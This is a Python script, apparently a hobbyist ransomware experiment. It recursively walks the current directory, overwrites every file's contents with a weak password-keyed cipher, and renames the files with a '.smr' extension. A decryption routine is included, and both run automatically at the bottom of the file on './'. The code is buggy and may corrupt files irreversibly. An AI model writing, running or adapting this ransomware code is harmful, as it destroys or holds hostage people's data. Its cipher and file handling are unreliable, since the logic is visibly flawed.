import os
import base64

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)                
    return allFiles

def vernan(string, password, mode):
    print(f"WORKING: {string}")
    print(f"Password: {password}")
    if len(password) < len(string):
        while len(password) < len(string):
            password = base64.b64encode(password.encode("ascii")).decode("ascii")

    print(f"Computed: {password[:20]}\n")
    i = 0
    aux = ""
    aux2 = []
    strLen = len(string)
#    if mode == "b":
#        strLen -= 1

    while i < strLen:
        if mode == "b":
#            print(f"Suma 127:{(int(string[i]) + 127)}")
#            print(f"Contra:{int(str(ord(password[i])))}")
# - int(str(ord(password[i])))}")
#            print(f"ERROR EN: {string[i]}")
#            print(f"Tamaño de array = {len(string)}")
#            print(f"Posicion actual = {i}")
            passw = int(str(ord(password[i])))
            if int(string[i]) < passw:
                string[i] = int(string[i]) + 127
            aux2.append(chr((int(string[i])) - passw))

        else:
            try:
                print(f"""string[i] = {string[i]}
ord() = {ord(string[i])}
str() = {str(ord(string[i]))}
int() = {int(str(ord(string[i])))}

""")
                print(f"Umm: {int(str(ord(string[i])))} + {int(str(ord(password[i])))} = {(int(str(ord(string[i]))) + int(str(ord(password[i]))))%127}")
                aux += str(((int(str(ord(string[i]))) + int(str(ord(password[i]))))%127))
                aux += "+"
            except Exception as err:
                print(err)

        i += 1
#    print(f"RETURN: {','.join(aux)}")
    if mode == "b":
        print(aux2)
        aux2 = "".join(aux2)
        print(bytearray.fromhex(aux2))
        return bytearray.fromhex(aux2)
    else:
        print(f"{aux[:-1]}")
        return aux[:-1]

def ransom(passw, ext, path):
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"

    i = 0;
    while i < len(files):
        if files[i] != thisFile :
            f = open(files[i], "r+b")
            fContent = f.read()
            print(f"""File: {os.getcwd()}{files[i][1:]}
Extension: {os.path.splitext(files[i])}
Content to cipher: {fContent[:20]}
Hex: {fContent[:20].hex()}
""")
            fContent = fContent.hex()
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+")
            f.seek(0)
            f.truncate()
            f.write("".join(vernan(fContent, passw, "f")))
            f.close()
        i += 1

# I want to separate logic in functions to simplify understanding.
def dransom(passw, ext, path):
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"

    i = 0;
    while i < len(files):
        if files[i] != thisFile :
            f = open(files[i], "r+")
            fContent = f.read()
            print(f"""File: {os.getcwd()}{files[i][1:]}
Extension: {os.path.splitext(files[i])}
Content to cipher: {fContent[:20]}
Hex: {fContent[:20]}
""")

            try:
                fContent = fContent.split("+")
            except Exception as err:
                print(f"Err atoi: {err}")
            print(fContent)
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+b")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+b")
            f.seek(0)
            f.truncate()

            f.write(vernan(fContent, passw, "b"))
            f.close()
        i += 1

        
ransom("1337", "smr", "./")    
dransom("1337", "smr", "./") 
